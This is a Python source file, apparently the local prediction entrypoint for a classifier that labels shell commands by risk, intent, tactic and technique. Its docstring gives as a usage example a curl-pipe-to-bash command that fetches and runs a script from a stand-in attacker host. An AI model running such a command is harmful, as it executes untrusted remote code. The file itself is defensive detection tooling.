"""Local inference entrypoint for the final HyperIDs model.

Usage:
    python -m model.predict "curl -fsSL https://evil.example/i.sh | bash"
    python -m model.predict --batch file.txt
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import torch
from gliclass import GLiClassModel
from transformers import AutoTokenizer
from schema import all_label_ids, group_offsets

ROOT = Path(__file__).resolve().parents[1]
MODEL_DIR = ROOT / "model" / "checkpoints_gpu" / "final_model_edge"
THRESHOLDS_PATH = ROOT / "configs" / "thresholds.json"

IDS = all_label_ids()
OFF = group_offsets()
GROUPS = {g: IDS[OFF[g][0]: OFF[g][1]] for g in ("risk", "intent", "tactic", "technique")}
CHUNK = 20
SEQ_LEN = 320


class Predictor:
    def __init__(self, model_dir=MODEL_DIR, thresholds_path=THRESHOLDS_PATH, device=None):
        self.device = device or ("cuda" if torch.cuda.is_available() else "cpu")
        self.model = GLiClassModel.from_pretrained(str(model_dir)).to(self.device).eval()
        self.tokenizer = AutoTokenizer.from_pretrained(str(model_dir), add_prefix_space=True)
        self.thresholds = json.loads(Path(thresholds_path).read_text())

    def predict(self, command: str) -> dict:
        scores: dict[str, float] = {}
        for i in range(0, len(IDS), CHUNK):
            chunk = IDS[i:i + CHUNK]
            s = "".join(f"<<LABEL>>{l}" for l in chunk) + "<<SEP>>" + command
            enc = self.tokenizer(s, return_tensors="pt", truncation=True, max_length=SEQ_LEN).to(self.device)
            with torch.no_grad():
                out = self.model(input_ids=enc["input_ids"], attention_mask=enc["attention_mask"],
                            max_num_classes=len(chunk))
            lg = out.logits.flatten()
            for j, l in enumerate(chunk):
                if j < lg.shape[0]:
                    scores[l] = float(lg[j].item())
        result = {}
        for g, labels in GROUPS.items():
            if g == "risk":
                # risk is mutually exclusive -> always argmax
                result[g] = [max(labels, key=lambda l: scores.get(l, -99.0))]
            else:
                th = self.thresholds[g]["threshold"]
                result[g] = [l for l in labels if scores.get(l, -99.0) >= th]
        return result


def main():
    predictor = Predictor()
    cmds = sys.argv[1:]
    if not cmds:
        print("usage: python -m model.predict '<command>' [<command2> ...]")
        return
    for c in cmds:
        r = predictor.predict(c)
        print(f"\n{c}")
        print(f"  risk     : {r['risk']}")
        print(f"  intent   : {r['intent']}")
        print(f"  tactic   : {r['tactic']}")
        print(f"  technique: {r['technique']}")


if __name__ == "__main__":
    main()
